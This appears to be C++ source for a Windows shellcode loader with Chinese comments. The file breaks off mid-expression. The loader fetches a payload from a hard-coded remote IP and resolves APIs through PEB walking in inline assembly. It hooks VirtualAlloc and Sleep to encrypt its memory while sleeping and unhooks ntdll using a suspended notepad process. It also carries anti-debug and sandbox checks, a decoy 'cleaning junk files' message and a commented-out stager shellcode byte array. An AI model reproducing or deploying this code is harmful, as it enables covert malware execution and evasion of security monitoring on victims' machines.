// shellcodehuifu.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//
#define WIN32_LEAN_AND_MEAN
#define _WINSOCK_DEPRECATED_NO_WARNINGS 
#include "HttpRequest.h"
//#include <WinSock2.h>
#include <Windows.h>
#include <stdio.h>
#include <intrin.h>
#include <iostream>
#include "conio.h"
#include <string>
//#include <netdb.h>
#include <ws2tcpip.h>
#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")  /* WinSock使用的库函数 */

using std::cout;
using namespace std;
//using namespace std;
//const char* str_orign = "abcdefghijklmnopqrstuvwxyz1234567890";

/* 定义常量 */
#define HTTP_DEF_PORT     80  /* 连接的缺省端口 */
#define HTTP_BUF_SIZE   1024  /* 缓冲区的大小   */
#define HTTP_HOST_LEN    256  /* 主机名长度 */

char* http_req_hdr_tmpl = "GET %s HTTP/1.1\r\n"
"Accept: image/gif, image/jpeg, */*\r\nAccept-Language: zh-cn\r\n"
"Accept-Encoding: gzip, deflate\r\nHost: %s:%d\r\n"
"User-Agent: Huiyong's Browser <0.1>\r\nConnection: Keep-Alive\r\n\r\n";

//#pragma comment(lib,"ws2_32.lib")
BYTE virtualallocOriginalBytes[5] = { 0 };   //read the 5 byte
BYTE sleepOriginalBytes[5] = { 0 };   //read the 5 byte
LPCVOID hookaddress_virutalallc = NULL;     //hook virtual address
LPCVOID hookaddress_sleep = NULL;     //hook sleep address
LPVOID address_virutalallc = NULL;    //virtual memory address
SIZE_T size_virutalallc = 0;  //virtual memort size
SIZE_T address_main_size = 0;  //main memory size
SIZE_T address_jQuery_size = 0;  //jQuery memory size
LPVOID address_jQuery;    //jqery memory address
LPVOID address_main;   //main memory address
const char* key_str = "abcd";  // 字符串类型的加密密钥
unsigned char key = key_str[0]; // 将字符串中的第一个字符转换为 unsigned char 类型
int hook_virtual_count = 0;


void HookVirtualAlloc();
void HookSleep();
#define PTCHAR char*
char str_orign_byhuibian() {











}



// HttpReq.cpp : 定义控制台应用程序的入口点。
//

// HttpReq.cpp : 定义控制台应用程序的入口点。
//

DWORD _getKernelBase()
{
    /*
    DWORD dwPEB;
    DWORD dwLDR;
    DWORD dwInitList;
    DWORD dwDllBase;//当前地址
    PIMAGE_DOS_HEADER pImageDosHeader;//指向DOS头的指针
    PIMAGE_NT_HEADERS pImageNtHeaders;//指向NT头的指针
    DWORD dwVirtualAddress;//导出表偏移地址
    PIMAGE_EXPORT_DIRECTORY pImageExportDirectory;//指向导出表的指针
    PTCHAR lpName;//指向dll名字的指针
    TCHAR szKernel32[] = TEXT("KERNEL32.dll");
    __asm
    {
        mov eax, FS: [0x30]//获取PEB所在地址
        mov dwPEB, eax
    }

    dwLDR = *(PDWORD)(dwPEB + 0xc);//获取PEB_LDR_DATA 结构指针
    dwInitList = *(PDWORD)(dwLDR + 0x1c);//获取InInitializationOrderModuleList 链表头
    //第一个LDR_MODULE节点InInitializationOrderModuleList成员的指针

    for (; dwDllBase = *(PDWORD)(dwInitList + 8);//结构偏移0x8处存放模块基址
        dwInitList = *(PDWORD)dwInitList//结构偏移0处存放下一模块结构的指针
        )
    {
        pImageDosHeader = (PIMAGE_DOS_HEADER)dwDllBase;
        pImageNtHeaders = (PIMAGE_NT_HEADERS)(dwDllBase + pImageDosHeader->e_lfanew);
        dwVirtualAddress = pImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress;//导出表偏移
        pImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(dwDllBase + dwVirtualAddress);//导出表地址
        lpName = (PTCHAR)(dwDllBase + pImageExportDirectory->Name);//dll名字

        if (strlen(lpName) == 0xc && !strcmp(lpName, szKernel32))//判断是否为“KERNEL32.dll”
        {
            //return dwDllBase;
            break;
        }
    }*/
    
    DWORD dwDllBase1;
    __asm {
    /*push ebp
        mov ebp, esp
        sub esp, 0x40*/
        xor ebx, ebx; EBX = 0x00000000
        mov ebx, fs: [ebx + 0x30] ;
    mov ebx, [ebx + 0xC]; EBX = Address_of_LDR
        mov ebx, [ebx + 0x1C]; EBX = 1st entry in InitOrderModuleList / ntdll.dll
        mov ebx, [ebx]; EBX = 2nd entry in InitOrderModuleList / kernelbase.dll
        mov ebx, [ebx]; EBX = 3rd entry in InitOrderModuleList / kernel32.dll
        mov eax, [ebx + 0x8]; EAX = &kernel32.dll / Address of kernel32.dll
        mov DWORD PTR dwDllBase1, eax
        /*   add esp, 0x40
        mov esp, ebp
        pop ebp
        ret*/
    }
    return dwDllBase1;
}

/*
获取指定字符串的API函数的调用地址
入口参数：_hModule为动态链接库的基址
_lpApi为API函数名的首址
出口参数：eax为函数在虚拟地址空间中的真实地址
*/

/*DWORD _getProcessAddress(DWORD _hModule, PTCHAR _lpApi)
    DWORD i;
    DWORD dwLen;
    PIMAGE_DOS_HEADER pImageDosHeader;//指向DOS头的指针
    PIMAGE_NT_HEADERS pImageNtHeaders;//指向NT头的指针
    DWORD dwVirtualAddress;//导出表偏移地址
    PIMAGE_EXPORT_DIRECTORY pImageExportDirectory;//指向导出表的指针
    TCHAR** lpAddressOfNames;
    PWORD lpAddressOfNameOrdinals;//计算API字符串的长度
    for (i = 0; _lpApi[i]; ++i);
    dwLen = i;

    pImageDosHeader = (PIMAGE_DOS_HEADER)_hModule;
    pImageNtHeaders = (PIMAGE_NT_HEADERS)(_hModule + pImageDosHeader->e_lfanew);
    dwVirtualAddress = pImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress;//导出表偏移
    pImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(_hModule + dwVirtualAddress);//导出表地址
    lpAddressOfNames = (TCHAR**)(_hModule + pImageExportDirectory->AddressOfNames);//按名字导出函数列表
    for (i = 0; _hModule + lpAddressOfNames[i]; ++i)
    {

        if (strlen(_hModule + lpAddressOfNames[i]) == dwLen &&
            !strcmp(_hModule + lpAddressOfNames[i], _lpApi))//判断是否为_lpApi
        {
            lpAddressOfNameOrdinals = (PWORD)(_hModule + pImageExportDirectory->AddressOfNameOrdinals);//按名字导出函数索引列表

            return _hModule + ((PDWORD)(_hModule + pImageExportDirectory->AddressOfFunctions))
                [lpAddressOfNameOrdinals[i]];//根据函数索引找到函数地址
        }
    }
    return 0;
    */
DWORD _getProcessAddress(DWORD address_base)
{
    //address_base = 0x76860000;
    DWORD dwDllBase1;
    __asm {

       /* push ebp
        mov ebp, esp
        sub esp, 0x40*/
        //xor ecx, ecx
        
        mov ebx, [address_base]; EBX = Base address
        mov edx, [ebx + 0x3c]; EDX = DOS->e_lfanew
        add edx, ebx; EDX = PE Header
        mov edx, [edx + 0x78]; EDX = export table
        add edx, ebx; EDX = Export table
        mov esi, [edx + 0x20]; ESI = namestable
        add esi, ebx; ESI = Names table
        xor ecx, ecx; EXC = 0
        Get_Function:
        inc ecx; Increment the ordinal
        lodsd; Get name
            add eax, ebx; Get function name
            cmp [eax], 50746547h; GetP
            jnz Get_Function
            cmp[eax + 0x04], 41636f72h; rocA
            jnz Get_Function
            cmp[eax + 0x08], 65726464h; ddre
            jnz Get_Function
            mov esi, [edx + 0x24]; ESI = ordinals
            add esi, ebx; ESI = Ordinals table
            mov cx, [esi + ecx * 2]; Number of function
            dec ecx
            mov esi, [edx + 0x1c];  address table
            add esi, ebx; ESI = Address table
            mov edx, [esi + ecx * 4]; EDX = Pointer()
            add edx, ebx; EDX = GetProcAddress
            mov eax, edx
            mov DWORD PTR dwDllBase1, eax
            /* add esp, 0x40
             mov esp, ebp
             pop ebp
             ret*/
          
}
    return dwDllBase1;

}

DWORD _getFunction_virtualalloc(DWORD getproaddress,DWORD kernel32) {
    DWORD dwDllBase1=0;
     __asm {
         /* push ebp
        mov ebp, esp*/
        mov eax, getproaddress
        //mov dword ptr [ebp - 8], eax; GetProcAddress    //并把winexec字符串压栈后期调用getproaddress用以获取winexec地址
        push 0x00
        push 0x636f6c6c
        push 0x416c6175
        push 0x74726956
        push esp
        push kernel32; [ebp - 4] ->Kernel32.DLL Base Addr
        call getproaddress; [ebp - 8] ->GetProcAddress Addr
        mov DWORD PTR dwDllBase1, eax
        /*mov esp, ebp
        pop ebp*/
        
    }
    return dwDllBase1;

}

DWORD _getFunction_sleep(DWORD getproaddress, DWORD kernel32) {
    DWORD dwDllBase1 = 0;
    __asm {
        /* push ebp
       mov ebp, esp*/
        mov eax, getproaddress
        //mov dword ptr [ebp - 8], eax; GetProcAddress    //并把winexec字符串压栈后期调用getproaddress用以获取winexec地址
        push 0x00000070   //p
        push 0x65656c53   //eelS
        push esp
        push kernel32; [ebp - 4] ->Kernel32.DLL Base Addr
        call getproaddress; [ebp - 8] ->GetProcAddress Addr
        mov DWORD PTR dwDllBase1, eax
        /*mov esp, ebp
        pop ebp*/

    }
    return dwDllBase1;

}
/*
_asm
{
Start:
    push ebp
        mov ebp, esp
        sub esp, 0x12
        call GetKernel32BaseAddr
        mov dword[ebp - 4], eax; Kernel32.dll Base Addr
        push eax
        call GetProcAddrFuncAddr//获取getprocaddress函数地址
        mov dword[ebp - 8], eax; GetProcAddress    //并把winexec字符串压栈后期调用getproaddress用以获取winexec地址
        push 0x00636578; xec, 0x00
        push 0x456e6957; WinE    //字符串用于传参
        push esp
        push dword[ebp - 4]; [ebp - 4] ->Kernel32.DLL Base Addr
        call dword[ebp - 8]; [ebp - 8] ->GetProcAddress Addr
        push 0; WinExec uCmdShow
        push 0x6578652e; exe. : 6578652e
        push 0x636c6163; clac: 636c6163
        push esp
        call eax    //调用winexec函数
        nop
        nop
        add esp, 0x12
        mov esp, ebp
        pop ebp
        ret
}*/
bool IsDebugged() {
    __try {
        __asm xor eax, eax;
        __asm int 0x2d;
        __asm nop;
        return true;
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        return false;
    }
}
bool isinsadbox() {
    char result = 0;
    __asm
    {
        mov eax,fs:[0x30] ;//获取PEB的地址。
        mov al, BYTE PTR[eax + 2];
        mov result,al;//得到BeingDebugged成员的值。
    }
    if (result == 1) {
        //printf("isdebugging\n");
        //system("pause");//为了观察方便，添加的。
        return true;
    }
    else {
        //printf("notdebugging\n");
        //system("pause");//为了观察方便，添加的。
        return false;
    }
    //system("pause");//为了观察方便，添加的。


}

bool detect_insadbox(){
    __asm {
        rdtsc
        xchg ebx, eax
        rdtsc
        sub eax,ebx
        cmp eax, 0xFF
        jg detected
        add esp, 4
        mov eax, FALSE
        ret
        detected:
        add esp, 4
        mov eax, TRUE
        ret
   }
}

void SetStrToMem(std::string str, char* mem)
{
    for (std::string::size_type ix = 0; ix != str.size(); ix = ix + 2)
    {
        std::basic_string <char> tmp = str.substr(ix, 2);
        char* s = NULL;
        char i = strtol(tmp.c_str(), &s, 16);
        memcpy(mem, &i, 1);
        mem++;
    }
}
void encrypt_memory(LPCVOID address_main1, size_t size, unsigned char key) {
    BYTE* memory_value = new BYTE[size];
    ReadProcessMemory(GetCurrentProcess(), address_main1, memory_value, size, NULL);  //获取全部内存
    printf("address main is : %p\n",address_main1);
    //char* buffer = new char[size * 3];
    printf("\n---------encrypt origin---------\n");
    //只输出前100个字节
    for (int i = 0; i < 10; i++)
    {
        printf("%02X ", memory_value[i]);
    }
    printf("\n---------encrypt origin---------\n");
    //printf("%s\n", buffer);
    for (size_t i = 0; i < size; i++) {
        memory_value[i] ^= key;
    }
    WriteProcessMemory(GetCurrentProcess(), (LPVOID)address_main1, memory_value, size, NULL);
    printf("\n---------encrypt xor after---------\n");
    for (int i = 0; i < 100; i++)
    {
        printf("%02X ", memory_value[i]);
    }
    printf("\n---------encrypt xor after---------\n");
 
}
void decrypt_memory(LPCVOID address_main1, size_t size, unsigned char key) {
    BYTE* memory_value = new BYTE[size];
    ReadProcessMemory(GetCurrentProcess(), address_main1, memory_value, size, NULL);  //获取全部内存
    printf("address main is : %p\n", address_main1);
    printf("\n---------decrypt xor after---------\n");
    for (int i = 0; i < 10; i++)
    {
        printf("%02X ", memory_value[i]);
    }
    for (size_t i = 0; i < size; i++) {
        memory_value[i] ^= key;
    }
    printf("\n--------decrypt origin----------\n");
    WriteProcessMemory(GetCurrentProcess(), (LPVOID)address_main1, memory_value, size, NULL);
    for (int i = 0; i < 100; i++)
    {
        printf("%02X ", memory_value[i]);
    }
    printf("\n---------decrypt origin---------\n");

}
LPVOID HookedVirtualAlloc(LPVOID lpAddress,SIZE_T dwSize,DWORD flAlloctionType,DWORD flProtect) {
    // 解除挂钩VirtualAlloc  
    WriteProcessMemory(GetCurrentProcess(), (LPVOID)hookaddress_virutalallc, virtualallocOriginalBytes, sizeof(virtualallocOriginalBytes), NULL);

    // 调用原来的VirtualAlloc  
    LPVOID address = VirtualAlloc(lpAddress,dwSize,flAlloctionType,flProtect);

    //printf("VirtialAlloc %08X %d %d %d %d \n", address, dwSize, flAlloctionType, flProtect);
    hook_virtual_count = hook_virtual_count+1;
    if (hook_virtual_count == 1) {
        address_jQuery = address;
        address_jQuery_size = dwSize;
    }
    if (hook_virtual_count == 2) {
        address_main = address;
        address_main_size = dwSize;
    }
    // 保存申请的地址
    address_virutalallc = address;
    size_virutalallc = dwSize;

    // 重新设置挂钩，以便下次监听  
    HookVirtualAlloc();
    return address;
}



void HookVirtualAlloc() {
    SIZE_T bytesRead = 0;
    // 保留Hook的前6个字节，解绑后需还原
    //LPCVOID hookaddress=NULL;
    
    ReadProcessMemory(GetCurrentProcess(), hookaddress_virutalallc, virtualallocOriginalBytes, 5, NULL);
    //DWORD error = GetLastError();
    //std::cerr << "Failed to read process memory. Error code: " << error << std::endl;
    // print the byte
    printf("\n");
    for (int i = 0; i < sizeof(virtualallocOriginalBytes); i++)
    {
        printf("%02X ", virtualallocOriginalBytes[i]);
    }
    printf("\n");
    // 计算相对地址    
    DWORD_PTR offsetAddress = (DWORD_PTR)HookedVirtualAlloc - (DWORD_PTR)hookaddress_virutalallc - 5;
    //char patch[6] = { 0x68,0,0,0,0,0xC3 };
    // 方式三，使用push ret绝对地址跳转push <绝对地址>   ; 68 <绝对地址>ret             ; C3
    char patch[5] = { 0xE9, 0, 0, 0, 0 };
    memcpy_s(patch + 1, 4, &offsetAddress, 4);
    //printf("\nhookaddress:%p\n", hookaddress_virutalallc);
    // 将挂钩写入VirtualAllocc内存    
    WriteProcessMemory(GetCurrentProcess(), (LPVOID)hookaddress_virutalallc, patch, sizeof(patch), NULL);

    



}
// 挂钩Sleep函数

VOID WINAPI HookedSleep(DWORD dwMilliseconds) {
    
    printf("sleep %d ms\n", dwMilliseconds);
    // 释放原内存
    /*
    if (runtime)
    {
        VirtualFree(runtime, shellcode_len, MEM_RELEASE);
        runtime = NULL;
    }*/
    PDWORD lpflOldProtect = NULL;
    // 加密新内存
    printf("address main memory:%p\n", address_main);
    printf("address main memory:%p\n", address_main);
    VirtualProtect(address_main, address_main_size, PAGE_READWRITE, lpflOldProtect);
    // 加密函数
    encrypt_memory(address_main, address_main_size, key);
    VirtualProtect(address_main, address_main_size, PAGE_NOACCESS, lpflOldProtect);
    // 解除挂钩VirtualAlloc
    WriteProcessMemory(GetCurrentProcess(), (LPVOID)hookaddress_sleep, sleepOriginalBytes, sizeof(sleepOriginalBytes), NULL);
    Sleep(dwMilliseconds);
    VirtualProtect(address_main, address_main_size, PAGE_READWRITE, lpflOldProtect);
    // 解密函数
    decrypt_memory(address_main, address_main_size, key);
    VirtualProtect(address_main, address_main_size, PAGE_EXECUTE, lpflOldProtect);
    // 重新挂钩
    HookSleep();


}

static int UnhookNtdll(const HMODULE hNtdll, const LPVOID pMapping) {

    typedef BOOL(WINAPI* VirtualProtect_t)(LPVOID, SIZE_T, DWORD, PDWORD);
    typedef HANDLE(WINAPI* CreateFileMappingA_t)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR);
    typedef LPVOID(WINAPI* MapViewOfFile_t)(HANDLE, DWORD, DWORD, DWORD, SIZE_T);
    typedef BOOL(WINAPI* UnmapViewOfFile_t)(LPCVOID);

    DWORD oldprotect = 0;
    PIMAGE_DOS_HEADER pImgDOSHead = (PIMAGE_DOS_HEADER)pMapping;
    PIMAGE_NT_HEADERS pImgNTHead = (PIMAGE_NT_HEADERS)((DWORD_PTR)pMapping + pImgDOSHead->e_lfanew);
    int i;

    unsigned char sVirtualProtect[] = { 'V','i','r','t','u','a','l','P','r','o','t','e','c','t', 0x0 };
    unsigned char sKernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0x0 };
    VirtualProtect_t VirtualProtect_p = (VirtualProtect_t)GetProcAddress(GetModuleHandle((LPCSTR)sKernel32), (LPCSTR)sVirtualProtect);

    for (i = 0; i < pImgNTHead->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER pImgSectionHead = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(pImgNTHead) +
            ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

        if (!strcmp((char*)pImgSectionHead->Name, ".text")) {
            VirtualProtect_p((LPVOID)((DWORD_PTR)hNtdll + (DWORD_PTR)pImgSectionHead->VirtualAddress),
                pImgSectionHead->Misc.VirtualSize,
                PAGE_EXECUTE_READWRITE,
                &oldprotect);
            if (!oldprotect) {
                return -1;
            }
            memcpy((LPVOID)((DWORD_PTR)hNtdll + (DWORD_PTR)pImgSectionHead->VirtualAddress),
                (LPVOID)((DWORD_PTR)pMapping + (DWORD_PTR)pImgSectionHead->VirtualAddress),
                pImgSectionHead->Misc.VirtualSize);

            VirtualProtect_p((LPVOID)((DWORD_PTR)hNtdll + (DWORD_PTR)pImgSectionHead->VirtualAddress),
                pImgSectionHead->Misc.VirtualSize,
                oldprotect,
                &oldprotect);
            if (!oldprotect) {
                return -1;
            }
            return 0;
        }
    }

    return -1;
}

LPVOID getNtdll() {

    LPVOID pntdll = NULL;

    //Create our suspended process
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
    CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);

    if (!pi.hProcess)
    {
        //printf("[-] Error creating process\r\n");
        return NULL;
    }

    //Get base address of NTDLL
    HANDLE process = GetCurrentProcess();
    MODULEINFO mi;
    HMODULE ntdllModule = GetModuleHandleA("ntdll.dll");
    GetModuleInformation(process, ntdllModule, &mi, sizeof(mi));


    pntdll = HeapAlloc(GetProcessHeap(), 0, mi.SizeOfImage);
    SIZE_T dwRead;
    BOOL bSuccess = ReadProcessMemory(pi.hProcess, (LPCVOID)mi.lpBaseOfDll, pntdll, mi.SizeOfImage, &dwRead);
    if (!bSuccess) {
        //printf("Failed in reading ntdll (%u)\n", GetLastError());
        return NULL;
    }


    TerminateProcess(pi.hProcess, 0);
    return pntdll;
}



// 脱钩ntdll
BOOL Unhook(LPVOID cleanNtdll) {

    char nt[] = { 'n','t','d','l','l','.','d','l','l', 0 };

    HANDLE hNtdll = GetModuleHandleA(nt);
    DWORD oldprotect = 0;
    PIMAGE_DOS_HEADER DOSheader = (PIMAGE_DOS_HEADER)cleanNtdll;
    PIMAGE_NT_HEADERS NTheader = (PIMAGE_NT_HEADERS)((DWORD64)cleanNtdll + DOSheader->e_lfanew);
    int i;


    // find .text section
    for (i = 0; i < NTheader->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER sectionHdr = (PIMAGE_SECTION_HEADER)((DWORD64)IMAGE_FIRST_SECTION(NTheader) + ((DWORD64)IMAGE_SIZEOF_SECTION_HEADER * i));

        char txt[] = { '.','t','e','x','t', 0 };

        if (!strcmp((char*)sectionHdr->Name, txt)) {

            // prepare ntdll.dll memory region for write permissions.
            BOOL ProtectStatus1 = VirtualProtect((LPVOID)((DWORD64)hNtdll + sectionHdr->VirtualAddress),
                sectionHdr->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldprotect);
            if (!ProtectStatus1) {
                //printf("Failed to change the protection (%u)\n", GetLastError());
                return FALSE;
            }

            // copy .text section from the mapped ntdll to the hooked one
            memcpy((LPVOID)((DWORD64)hNtdll + sectionHdr->VirtualAddress), (LPVOID)((DWORD64)cleanNtdll + sectionHdr->VirtualAddress), sectionHdr->Misc.VirtualSize);


            // restore original protection settings of ntdll
            BOOL ProtectStatus2 = VirtualProtect((LPVOID)((DWORD64)hNtdll + sectionHdr->VirtualAddress),
                sectionHdr->Misc.VirtualSize, oldprotect, &oldprotect);
            if (!ProtectStatus2) {
                //printf("Failed to change the protection back (%u)\n", GetLastError());
                return FALSE;
            }

        }
    }

    return TRUE;

}




void HookSleep() {
    SIZE_T bytesRead = 0;
    // 保留Hook的前5个字节，解绑后需还原
    ReadProcessMemory(GetCurrentProcess(), hookaddress_sleep, sleepOriginalBytes, 5, &bytesRead);
    // 计算相对地址    
    //DWORD_PTR offsetAddress = (DWORD_PTR)HookedMessageBox - (DWORD_PTR)oldAddress - 5;
    //void* hookedAddress = HookedMessageBox;
    //char patch[6] = { 0x68,0,0,0,0,0xC3 };
    // 方式三，使用push ret绝对地址跳转push <绝对地址>   ; 68 <绝对地址>ret             ; C3
    printf("\n");
    for (int i = 0; i < sizeof(sleepOriginalBytes); i++)
    {
        printf("%02X ", sleepOriginalBytes[i]);
    }
    printf("\n");
    char patch[5] = { 0xE9, 0, 0, 0, 0 };
    // 计算偏移
    DWORD dwOffeset = (DWORD_PTR)HookedSleep - (DWORD)hookaddress_sleep - 5;
    memcpy_s(patch + 1, 4, &dwOffeset, 4);
    // 将挂钩写入MessageBoxA内存    
    WriteProcessMemory(GetCurrentProcess(), (LPVOID)hookaddress_sleep, patch, sizeof(patch), NULL);

}
int main(int argc, CHAR* argv[]) {
    // hide the windows
    //HWND hwndDOS = GetForegroundWindow();
    //ShowWindow(hwndDOS, SW_HIDE);
    HttpRequest httpReq("101.42.175.89", 65523);
    std::string res = httpReq.HttpGet("/e");
    std::string str_orign = "vwxyz123456789011111111";
    str_orign = res;

    /* length: 798 bytes */
    //if (argc > 1) {
        //if (std::strcmp(argv[1], "aligaduo") == 0) {
            //cout << "nihao" << std::endl;
            //return 0;


            //unsigned char buf[] = "\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x6e\x65\x74\x00\x68\x77\x69\x6e\x69\x54\x68\x4c\x77\x26\x07\xff\xd5\x31\xff\x57\x57\x57\x57\x57\x68\x3a\x56\x79\xa7\xff\xd5\xe9\x84\x00\x00\x00\x5b\x31\xc9\x51\x51\x6a\x03\x51\x51\x68\xbe\x22\x00\x00\x53\x50\x68\x57\x89\x9f\xc6\xff\xd5\xeb\x70\x5b\x31\xd2\x52\x68\x00\x02\x40\x84\x52\x52\x52\x53\x52\x50\x68\xeb\x55\x2e\x3b\xff\xd5\x89\xc6\x83\xc3\x50\x31\xff\x57\x57\x6a\xff\x53\x56\x68\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x84\xc3\x01\x00\x00\x31\xff\x85\xf6\x74\x04\x89\xf9\xeb\x09\x68\xaa\xc5\xe2\x5d\xff\xd5\x89\xc1\x68\x45\x21\x5e\x31\xff\xd5\x31\xff\x57\x6a\x07\x51\x56\x50\x68\xb7\x57\xe0\x0b\xff\xd5\xbf\x00\x2f\x00\x00\x39\xc7\x74\xb7\x31\xff\xe9\x91\x01\x00\x00\xe9\xc9\x01\x00\x00\xe8\x8b\xff\xff\xff\x2f\x6a\x71\x75\x65\x72\x79\x2d\x33\x2e\x33\x2e\x31\x2e\x73\x6c\x69\x6d\x2e\x6d\x69\x6e\x2e\x6a\x73\x00\x5e\x1d\xe4\x84\xdc\x40\x11\x97\x9d\x7a\x09\x4e\x48\xed\x22\x15\xfc\x96\xdb\xb8\x0e\x4a\xda\x1d\xeb\x08\x5b\x9d\x03\xf1\xce\x5e\x31\x53\xef\xa8\x52\xf2\xc1\xd2\xb3\x51\x8d\xf9\xc2\xd7\x91\xc4\x9a\xae\x8a\xef\x52\x00\x41\x63\x63\x65\x70\x74\x3a\x20\x74\x65\x78\x74\x2f\x68\x74\x6d\x6c\x2c\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x78\x68\x74\x6d\x6c\x2b\x78\x6d\x6c\x2c\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x78\x6d\x6c\x3b\x71\x3d\x30\x2e\x39\x2c\x2a\x2f\x2a\x3b\x71\x3d\x30\x2e\x38\x0d\x0a\x41\x63\x63\x65\x70\x74\x2d\x4c\x61\x6e\x67\x75\x61\x67\x65\x3a\x20\x65\x6e\x2d\x55\x53\x2c\x65\x6e\x3b\x71\x3d\x30\x2e\x35\x0d\x0a\x52\x65\x66\x65\x72\x65\x72\x3a\x20\x68\x74\x74\x70\x3a\x2f\x2f\x63\x6f\x64\x65\x2e\x6a\x71\x75\x65\x72\x79\x2e\x63\x6f\x6d\x2f\x0d\x0a\x41\x63\x63\x65\x70\x74\x2d\x45\x6e\x63\x6f\x64\x69\x6e\x67\x3a\x20\x67\x7a\x69\x70\x2c\x20\x64\x65\x66\x6c\x61\x74\x65\x0d\x0a\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x33\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x37\x2e\x30\x3b\x20\x72\x76\x3a\x31\x31\x2e\x30\x29\x20\x6c\x69\x6b\x65\x20\x47\x65\x63\x6b\x6f\x0d\x0a\x00\xe4\x72\xa5\x15\x6f\x52\x62\x34\xc6\x29\x33\xb5\xc0\x12\xed\x39\xcc\xe5\x76\x98\x14\x86\x12\xb8\xd1\xe3\x5d\xbd\x92\x4a\xcb\xfb\xbb\x25\xef\x0e\x38\xcf\x96\x5a\x10\x63\x06\x05\x3c\xd2\x22\x76\xfd\x0b\x29\x8c\x03\x15\x8b\x00\x68\xf0\xb5\xa2\x56\xff\xd5\x6a\x40\x68\x00\x10\x00\x00\x68\x00\x00\x40\x00\x57\x68\x58\xa4\x53\xe5\xff\xd5\x93\xb9\xaf\x0f\x00\x00\x01\xd9\x51\x53\x89\xe7\x57\x68\x00\x20\x00\x00\x53\x56\x68\x12\x96\x89\xe2\xff\xd5\x85\xc0\x74\xc6\x8b\x07\x01\xc3\x85\xc0\x75\xe5\x58\xc3\xe8\xa9\xfd\xff\xff\x34\x37\x2e\x39\x34\x2e\x32\x34\x39\x2e\x31\x32\x36\x00\x05\xf5\xe1\x00";
           /*  bool isinsadboxa = isinsadbox();
            if (isinsadboxa == true) {
                printf(" echo 正在清除系统垃圾文件，请稍等...... \n");
                return 0;
            }*/
            //bool detected = detect_insadbox();
            //if (detected == true) {
                //printf("isinsadbox\n");
               // system("pause");//为了观察方便，添加的。
             //   return 0;

           // }
            /*
            bool isdebug=IsDebugged();   //判断是否被调试
            if (isdebug==true)
            {
                printf(" echo 正在清除系统垃圾文件，请稍等...... \n");
                return 0;
            }*/
            /*
            printf(" echo 正在清除系统垃圾文件，请稍等...... \n");
            printf("del  / / %systemdrive%\*.tmp \n");
            printf("del / / / %systemdrive%\*._mp\n");
            printf(" del / / / %systemdrive%\*.log\n");
            printf("del / / / %systemdrive%\*.gid \n");
            printf(" del  / / %systemdrive%\*.chk  \n");
            printf("del / / / %systemdrive%\*.old \n"); */
            //WSACleanup();
            int aaa;
            //std::cin >> aaa;
            //if (aaa*521!= 4036708)
            //{
            //    return 0;
            //}
            std::string str = "";
            //str = str + str_orign[5] + str_orign[2] + str_orign[29] + str_orign[33] + str_orign[33] + str_orign[28] + str_orign[4] + str_orign[29] + str_orign[5] + str_orign[35] + str_orign[4] + str_orign[33] + str_orign[2] + str_orign[33] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[29] + str_orign[26] + str_orign[30] + str_orign[26] + str_orign[29] + str_orign[26] + str_orign[30] + str_orign[35] + str_orign[30] + str_orign[27] + str_orign[30] + str_orign[26] + str_orign[30] + str_orign[31] + str_orign[29] + str_orign[33] + str_orign[28] + str_orign[26] + str_orign[3] + str_orign[27] + str_orign[31] + str_orign[30] + str_orign[29] + str_orign[33] + str_orign[33] + str_orign[1] + str_orign[30] + str_orign[27] + str_orign[31] + str_orign[35] + str_orign[29] + str_orign[33] + str_orign[33] + str_orign[1] + str_orign[30] + str_orign[27] + str_orign[26] + str_orign[33] + str_orign[29] + str_orign[33] + str_orign[33] + str_orign[1] + str_orign[30] + str_orign[27] + str_orign[27] + str_orign[35] + str_orign[29] + str_orign[33] + str_orign[33] + str_orign[1] + str_orign[32] + str_orign[27] + str_orign[30] + str_orign[35] + str_orign[29] + str_orign[33] + 